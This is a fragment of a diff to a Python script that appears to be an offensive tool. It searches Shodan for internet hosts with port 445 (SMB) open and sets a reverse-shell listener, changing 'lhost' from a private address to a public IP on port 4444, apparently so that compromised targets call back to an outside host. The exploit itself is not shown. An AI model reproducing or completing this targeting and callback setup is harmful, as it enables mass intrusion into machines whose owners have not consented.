@@ -83,7 +83,7 @@ def mainShodan445():
 		# Perform the search
 		query = "port:445"
 		result = api.search(query)
-		lhost='192.168.1.100'
+		lhost='23.106.122.184'
 		lport='4444'
 		ips=''
 		for service in result['matches']:
